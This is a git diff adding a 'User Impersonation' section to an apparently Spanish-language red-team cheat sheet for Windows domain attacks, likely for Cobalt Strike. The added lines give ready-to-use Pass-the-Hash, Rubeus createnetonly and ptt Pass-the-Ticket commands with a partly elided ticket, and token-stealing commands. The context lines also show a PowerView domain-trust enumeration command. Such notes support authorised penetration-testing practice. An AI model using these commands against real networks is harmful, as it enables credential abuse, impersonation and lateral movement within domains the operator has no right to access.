@@ -231,3 +231,27 @@ Ver la confianza del dominio actual con el resto
 ```
 powershell Get-DomainTrust
 ```
+# User Impersonation (para volver al usuario actual: rev2self)
+
+## Pass The Hash
+```
+pth dominio\usuario HASH
+```
+## Pass The Ticket
+
+Coger el LUID e ID del proceso cmd.exe
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+```
+Pasar el ticket al proceso
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
+```
+Robar el token
+```
+steal_token proceso
+```
+Matar el proceso cuando se haga rev2self
+```
+kill proceso
+```
